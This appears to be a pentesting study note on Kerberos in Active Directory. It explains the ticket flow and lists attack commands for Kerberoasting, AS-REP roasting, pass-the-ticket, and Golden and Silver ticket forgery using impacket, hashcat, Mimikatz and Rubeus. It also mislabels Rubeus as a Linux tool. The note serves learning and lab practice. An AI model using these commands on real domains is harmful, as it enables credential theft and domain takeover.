# 📌 Kerberos Authentication

> Ticket-based auth protocol used by Active Directory — no plaintext passwords fly over the wire, but the tickets themselves are the attack surface.

---

## 🔍 Definition

Kerberos is a symmetric-key authentication protocol developed at MIT, operating on **port 88/UDP**. It uses a trusted third party (the **KDC**) to issue time-limited tickets that prove identity — instead of sending passwords. The DC runs the KDC. Compromising the KDC = compromising the entire domain.

---

## 🧠 Core Concepts

- **KDC (Key Distribution Center)** — runs on the DC. Contains two sub-services: AS and TGS
- **AS (Authentication Server)** — handles the initial auth and issues the TGT
- **TGS (Ticket Granting Server)** — issues service tickets (TGS tickets) after you present a valid TGT
- **TGT (Ticket Granting Ticket)** — proof of identity, encrypted with the `krbtgt` account's hash. Valid for 10 hours by default
- **TGS/Service Ticket (ST)** — grants access to a *specific* service, encrypted with the **service account's hash**
- **krbtgt account** — special domain account whose hash encrypts all TGTs. Stealing this = Golden Ticket
- **SPN (Service Principal Name)** — unique label for a service (e.g., `HTTP/webserver.corp.local`). Required for Kerberos service auth
- **PAC (Privilege Attribute Certificate)** — embedded in tickets, holds user group memberships + SID. Signed by KDC
- **Pre-authentication** — default requirement: client must prove they know the password before getting a TGT. Disabling this enables AS-REP Roasting
- **Session Keys** — temporary symmetric keys generated per-session to encrypt comms between client and KDC / client and service

---

## ⚙️ How It Works (Full Flow)

**Phase 1: Getting the TGT**

1. **AS-REQ** — Client sends request to KDC. Includes: username, timestamp encrypted with the user's NTLM hash (pre-auth data)
2. **AS-REP** — KDC decrypts the timestamp, verifies it matches the stored hash. Issues:
   - **TGT** — encrypted with `krbtgt` hash (client cannot read this)
   - **Session Key (SK1)** — encrypted with client's NTLM hash (client CAN decrypt this)
   - Client stores TGT in memory

**Phase 2: Getting a Service Ticket**

3. **TGS-REQ** — Client presents TGT + SPN of target service + an authenticator (timestamp encrypted with SK1)
4. **TGS-REP** — KDC decrypts TGT with `krbtgt` hash, validates session key, checks SPN. Issues:
   - **Service Ticket (ST)** — encrypted with the **service account's NTLM hash** (client cannot read this)
   - **Session Key (SK2)** — encrypted with SK1 (client can decrypt)
   - ⚡ This is where **Kerberoasting** lives — ST is encrypted with the service account hash, attackers can take it offline and crack it

**Phase 3: Accessing the Service**

5. **AP-REQ** — Client sends ST to the service. Service decrypts ST with its own NTLM hash, reads PAC, verifies identity
6. **AP-REP** (optional) — Service sends response encrypted with SK2 = mutual authentication

> 💡 The client **never** sends its password. The KDC authenticates by checking if the client can correctly encrypt a timestamp — proving they know the password hash.

---

## 📖 Key Terminology

| Term | Meaning |
|------|---------|
| AS-REQ / AS-REP | Client ↔ KDC: auth request and TGT response |
| TGS-REQ / TGS-REP | Client ↔ KDC: service ticket request and response |
| AP-REQ / AP-REP | Client ↔ Service: service access request |
| Pre-auth | Requires encrypted timestamp proof — prevents AS-REP Roasting when enabled |
| RC4 / AES | Encryption types used in tickets. RC4 = faster to crack (Kerberoasting targets this) |
| KIRBI | Windows Kerberos ticket format (`.kirbi` files in memory via Mimikatz) |
| CCACHE | Linux/MIT Kerberos ticket format (stored in `/tmp/krb5cc_*`) |
| Delegation | Allows a service to request tickets on behalf of a user (S4U2Self, S4U2Proxy) |
| Constrained Delegation | Restricts which services a service can impersonate users to |
| Unconstrained Delegation | Allows a service to impersonate users to ANY service — huge attack surface |

---

## 🔥 Important Details & Gotchas

- **TGT lifetime** is 10 hours by default, renewable for 7 days — a stolen TGT has a window
- **RC4 (NTLM) encryption** is still supported for backward compat. Kerberoasted RC4 hashes crack way faster than AES-256 — look for `$krb5tgs$23$` (RC4) vs `$krb5tgs$18$` (AES256)
- **Pre-auth is enabled by default** — but sysadmins sometimes disable it for service accounts or older apps, enabling AS-REP Roasting with zero creds
- **Kerberoasting doesn't exploit a bug** — it's working as designed. The DC gives you the encrypted service ticket because you're a valid user. The weakness is a crackable service account password
- **AS-REP Roasting needs no creds at all** if you have a username list — the KDC will respond with an AS-REP even for unauthenticated requests when pre-auth is disabled
- **Unconstrained delegation** = if you compromise a machine with unconstrained delegation, any user that authenticates to it will have their TGT stored in LSASS — steal it
- **The PAC** is what controls what you can access. In older systems, services didn't always verify PAC signatures — enabling MS14-068 (PAC forgery) to escalate to DA
- **Clock skew** — Kerberos requires clocks to be within 5 minutes of each other. Too much drift = auth fails (good to know when troubleshooting labs)

---

## 🌍 Real-World Usage / Examples

**Kerberoasting** — Request a service ticket offline, crack it:
```bash
# From Kali (needs one valid domain user)
impacket-GetUserSPNs corp.local/user:pass -dc-ip <DC-IP> -request

# Output: $krb5tgs$23$*svc_mssql$CORP.LOCAL$...
# Crack with hashcat
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt
```

**AS-REP Roasting** — No creds needed if pre-auth is disabled:
```bash
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip <DC-IP> -no-pass -format hashcat

# Output: $krb5asrep$23$user@...
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

**Pass-the-Ticket** — Steal and inject a TGT:
```bash
# On Windows with Mimikatz
sekurlsa::tickets /export   # dumps .kirbi files
kerberos::ptt ticket.kirbi  # inject into current session

# On Linux with Rubeus
.\Rubeus.exe dump /nowrap   # export as base64
.\Rubeus.exe ptt /ticket:base64blob
```

**Golden Ticket** — Forge a TGT using krbtgt hash:
```bash
# Need: krbtgt NTLM hash + domain SID
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <SID> -domain corp.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@<DC-IP>
```

**Silver Ticket** — Forge a TGS for a specific service (stealthier):
```bash
# Need: service account NTLM hash + domain SID + SPN
impacket-ticketer -nthash <svc_hash> -domain-sid <SID> -domain corp.local -spn cifs/<server>.corp.local Administrator
```

---

## 🔗 Related Topics

- [[Active Directory (AD)]]
- [[NTLM and Pass-the-Hash]]
- [[AD Certificate Services (AD CS)]]
- [[BloodHound & Attack Path Analysis]]
- [[Lateral Movement]]
- [[Kerberoasting Deep Dive]]
- [[Delegation Attacks (Constrained, Unconstrained)]]

---

## 📚 Sources / Further Reading

- [Tarlogic — How Kerberos Works](https://www.tarlogic.com/blog/how-kerberos-works/) — deep protocol breakdown
- [The Hacker Recipes — Kerberos](https://www.thehacker.recipes/ad/movement/kerberos/) — attack-focused with S4U detail
- [hackingdream.net — Kerberos Attacks](https://www.hackingdream.net/2025/03/understanding-kerberos-authentication-and-its-attacks.html) — Golden/Silver ticket focus
- HTB Machines: `Active` (Kerberoasting), `Forest` (AS-REP Roasting)
- TryHackMe: `Attacktive Directory`
